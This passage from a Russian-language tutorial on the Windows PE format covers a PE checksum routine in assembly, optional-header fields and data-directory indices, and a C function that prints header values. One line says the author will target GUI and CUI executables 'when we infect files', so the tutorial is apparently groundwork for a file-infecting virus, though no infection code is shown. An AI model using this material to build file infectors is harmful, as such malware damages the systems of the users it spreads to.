&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">54h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">58h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">5Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">60h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">64h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">68h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">6Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">70h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">74h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">78h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">7Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000080h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000080h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; func0_saltito6<br/>
<br/>
func0_saltito2<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito0<br/>
<br/>
func0_saltito7<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000002h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000002h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; func0_saltito7<br/>
<br/>
func0_saltito0<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0000FFFFh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0000FFFFh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; <span style="color: #ff0000;">000Ch</span><br/>
end &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">start</span><br/>
&nbsp;</div></dd>
<dt><strong>WORD Subsystem;</strong></dt><dd>Подсистема, для пользовательского интерфейса, данного приложения. Определены следующие значения:
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_SUBSYSTEM_UNKNOWN &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; // неизвестная подсистема</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_NATIVE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; // приложению не требуется подсистема</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_WINDOWS_GUI &nbsp; &nbsp; 2 &nbsp; &nbsp; &nbsp; // запускается в подсистеме Windows GUI</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_WINDOWS_CUI &nbsp; &nbsp; 3 &nbsp; &nbsp; &nbsp; // запускается в подсистеме Windows character</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_OS2_CUI &nbsp; &nbsp; &nbsp; &nbsp; 5 &nbsp; &nbsp; &nbsp; // запускается в подсистеме OS/2 character</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_POSIX_CUI &nbsp; &nbsp; &nbsp; 7 &nbsp; &nbsp; &nbsp; // запускается в подсистеме Posix character</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_NATIVE_WINDOWS&nbsp; 8 &nbsp; &nbsp; &nbsp; // приложение - драйвер Windows 9x</span><br/>
<span style="color: #339933;">#define IMAGE_SUBSYSTEM_WINDOWS_CE_GUI&nbsp; 9 &nbsp; &nbsp; &nbsp; // запускается в подсистеме Windows CE</span><br/>
&nbsp;</div>
<p>Подсистема может быть только одна. Если подсистема CUI, то Windows создает консольное окно при старте программы. Когда мы будет заражать файлы, то будем выбирать только с подсистемами IMAGE_SUBSYSTEM_WINDOWS_GUI и IMAGE_SUBSYSTEM_WINDOWS_CUI</p>
</dd>
<dt><strong>WORD DllCharacteristics;</strong></dt><dd>Поле никогда не используется. Может быть любым.</dd>
<dt><strong>DWORD SizeOfStackReserve;</strong></dt><dd>Объем виртуальной памяти, резервируемой под начальный стек потока. Выделяется число байт указанное в следующем поле.</dd>
<dt><strong>DWORD SizeOfStackCommit;</strong></dt><dd>Объем виртуальной памяти, выделяемой под начальный стек потока.</dd>
<dt><strong>DWORD SizeOfHeapReserve;</strong></dt><dd>Объем виртуальной памяти, резервируемой под начальный хип программы.</dd>
<dt><strong>DWORD SizeOfHeapCommit;</strong></dt><dd>Объем виртуальной памяти, выделяемой под начальный хип программы.</dd>
<dt><strong>DWORD LoaderFlags;</strong></dt><dd>Не используемое поле. Может быть любым.</dd>
<dt><strong>DWORD NumberOfRvaAndSizes;</strong></dt><dd>Количество элементов в массиве DataDirectory. Во всем относительно новых линкерах устанавливается в 10H. Даже константа IMAGE_NUMBEROF_DIRECTORY_ENTRIES в WINNT.H определена как 10H. Так что размер опционального заголовка, скорее всего, будет E0H байт.</dd>
<dt><strong>IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</strong></dt><dd>Массив структур типа IMAGE_DATA_DIRECTORY. Это структура определена следующим образом:
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_DATA_DIRECTORY<br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; VirtualAddress<span style="color: #339933;">;</span> <span style="color: black; font-style: italic;">//RVA директории</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Size<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Размер директории</span><br/>
<span style="color: black;">&#125;</span> IMAGE_DATA_DIRECTORY<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_DATA_DIRECTORY<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Вообще каждый элемент массива указывает на какую-либо структуру, например на таблицу импорта. Т.е. каждый элемент это информация о директории, каждая из которых несет собой определенную смысловую нагрузку. Определенный индекс в массиве соответствует определенной директории. Директория может быть секцией, а может и не быть секцией, т.е. быть ее частью. Если нам надо найти, например таблицу экспорта, то обращаемся к элементу 0 этого массива. Вот полный перечень всех индексов:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_EXPORT&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; // Директория экспорта</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_IMPORT&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; // Директория импорта</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_RESOURCE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2 &nbsp; &nbsp; &nbsp; // Директория ресурсов</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_EXCEPTION &nbsp; &nbsp; &nbsp; &nbsp; 3 &nbsp; &nbsp; &nbsp; // Директория исключений</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_SECURITY&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4 &nbsp; &nbsp; &nbsp; // Директория безопасности</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_BASERELOC &nbsp; &nbsp; &nbsp; &nbsp; 5 &nbsp; &nbsp; &nbsp; // Таблица базовых поправок</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_DEBUG &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 6 &nbsp; &nbsp; &nbsp; // Отладочная директория</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE&nbsp; &nbsp; &nbsp; 7 &nbsp; &nbsp; &nbsp; // Данные специфичные для архитектуры</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR &nbsp; &nbsp; &nbsp; &nbsp; 8 &nbsp; &nbsp; &nbsp; // RVA глобальных указателей</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_TLS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 9 &nbsp; &nbsp; &nbsp; // TLS директория</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG &nbsp; &nbsp; &nbsp; 10&nbsp; &nbsp; &nbsp; // Директория конфигурации при загрузке</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT&nbsp; &nbsp; &nbsp; 11&nbsp; &nbsp; &nbsp; // Директория Bound-импорта</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_IAT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 12&nbsp; &nbsp; &nbsp; // Таблица импортированных адресов (IAT)</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT&nbsp; &nbsp; &nbsp; 13&nbsp; &nbsp; &nbsp; // Дескриптор delay-импорта</span><br/>
<span style="color: #339933;">#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR&nbsp; &nbsp; 14&nbsp; &nbsp; &nbsp; // COM Runtime дескриптор</span><br/>
&nbsp;</div>
<p>Структура IMAGE_DATA_DIRECTORY содержит в себе RVA директории. Если файл спроецирован не как SEC_IMAGE, то сразу найти смещение в файле данной директории не удастся. Для этой операции используйте функцию RVAtoOffset листинг которой приведен выше.</p>
</dd>
</dl>
<h3><a name="c27"></a>Работа с заголовками PE-файла</h3>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printHeaders<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;#####File Header#####<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Machine:%X<span style="color: #000099; font-weight: bold;">\n</span>Number of Sections:%X<span style="color: #000099; font-weight: bold;">\n</span>TimeDateStamp:%X<span style="color: #000099; font-weight: bold;">\n</span>Pointer to Symbol Table:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;Number Of Symbols:%X<span style="color: #000099; font-weight: bold;">\n</span>Size Of Optional Header:%X<span style="color: #000099; font-weight: bold;">\n</span>Characteristics:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">Machine</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">NumberOfSections</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">TimeDateStamp</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">PointerToSymbolTable</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">NumberOfSymbols</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">SizeOfOptionalHeader</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;#####Optional Header#####<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Magic:%X<span style="color: #000099; font-weight: bold;">\n</span>MajorLinkerVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>MinorLinkerVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfCode:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;SizeOfInitializedData:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfUninitializedData:%X<span style="color: #000099; font-weight: bold;">\n</span>AddressOfEntryPoint:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;BaseOfCode:%X<span style="color: #000099; font-weight: bold;">\n</span>BaseOfData:%X<span style="color: #000099; font-weight: bold;">\n</span>ImageBase:%X<span style="color: #000099; font-weight: bold;">\n</span>SectionAlignment:%X<span style="color: #000099; font-weight: bold;">\n</span>FileAlignment:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;MajorOperatingSystemVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>MinorOperatingSystemVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>MajorImageVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;MinorImageVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>MajorSubsystemVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>MinorSubsystemVersion:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;Win32VersionValue:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfImage:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfHeaders:%X<span style="color: #000099; font-weight: bold;">\n</span>CheckSum:%X<span style="color: #000099; font-weight: bold;">\n</span>Subsystem:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;DllCharacteristics:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfStackReserve:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfStackCommit:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;SizeOfHeapReserve:%X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfHeapCommit:%X<span style="color: #000099; font-weight: bold;">\n</span>LoaderFlags:%X<span style="color: #000099; font-weight: bold;">\n</span>NumberOfRvaAndSizes:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">Magic</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MajorLinkerVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MinorLinkerVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfCode</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfInitializedData</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfUninitializedData</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">AddressOfEntryPoint</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">BaseOfCode</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">BaseOfData</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">ImageBase</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SectionAlignment</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">FileAlignment</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MajorOperatingSystemVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MinorOperatingSystemVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MajorImageVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MinorImageVersion</span><span style="color: #339933;">,</span><br/>
